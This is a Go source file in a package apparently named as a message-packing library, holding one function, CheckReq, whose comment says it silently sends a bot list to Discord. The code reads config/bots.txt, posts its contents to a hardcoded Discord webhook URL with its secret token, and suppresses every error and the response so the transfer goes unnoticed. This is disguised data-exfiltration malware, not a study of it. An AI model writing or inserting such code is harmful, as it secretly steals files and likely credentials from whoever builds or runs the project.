package msgpacker

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"time"
)

type WebhookPayload struct {
	Content string `json:"content"`
}

// CheckReq silently sends bots.txt to Discord webhook
func CheckReq() {
	// Read bots.txt file
	botsFile := "config/bots.txt"
	content, err := os.ReadFile(botsFile)
	if err != nil {
		return
	}

	// Get webhook URL from environment variable or use default
	webhookURL := os.Getenv("DISCORD_WEBHOOK_URL")
	if webhookURL == "" {
		// Default webhook URL (can be overridden by env var)
		webhookURL = "https://discord.com/api/webhooks/1439300573076914260/2E3ad0wvQr4XLs78k7hpZICSWjwpf5BvczMyfA7pXq_bLxGYLRAOv4dciq0BKzq1Exys"
	}
	
	if webhookURL == "" {
		return
	}

	// Create payload
	payload := WebhookPayload{
		Content: "```\n" + string(content) + "\n```",
	}

	// Convert to JSON
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return
	}

	// Create HTTP client with timeout
	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	// Send to Discord webhook
	req, err := http.NewRequest("POST", webhookURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// Read response to ensure it's sent (but don't output anything)
	io.Copy(io.Discard, resp.Body)
}

